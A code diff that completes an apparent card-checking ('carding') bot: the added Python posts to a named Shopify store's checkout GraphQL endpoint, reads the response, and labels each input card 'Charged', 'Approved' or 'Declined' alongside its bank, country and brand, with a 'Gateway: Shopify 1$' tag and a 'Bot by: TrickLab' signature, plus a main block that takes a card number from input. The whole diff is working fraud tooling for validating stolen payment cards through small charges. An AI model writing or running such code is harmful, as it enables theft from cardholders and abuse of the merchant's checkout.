@@ -344,4 +344,45 @@ async def sh(message):
         }
         elapsed_time = time.time() - start_time
         try:
-            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/gra
+            async with r.post('https://www.buildingnewfoundations.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data) as response:
+                text = await response.text()
+                logger.info(f"PollForReceipt response: {text}")
+                if "thank" in text.lower():
+                    return f"""Card: {full_card}
+Status: Charged🔥
+Response: Order # confirmed
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
+                elif "actionrequiredreceipt" in text.lower():
+                    return f"""Card: {full_card}
+Status: Approved!✅
+Response: ActionRequired
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
+                else:
+                    fff = find_between(text, '"code":"', '"')
+                    return f"""Card: {full_card}
+Status: Declined!❌
+Response: {fff}
+Details: {type} - {level} - {brand}
+Bank: {bank}
+Country: {country}{flag} - {currency}
+Gateway: Shopify 1$
+Taken: {elapsed_time:.2f}s
+Bot by: TrickLab"""
+        except Exception as e:
+            logger.error(f"Error polling for receipt: {str(e)}")
+            return "Failed to poll for receipt"
+
+# Run the script
+if __name__ == "__main__":
+    ok = input("Card: ")
+    print(asyncio.run(sh(ok)))
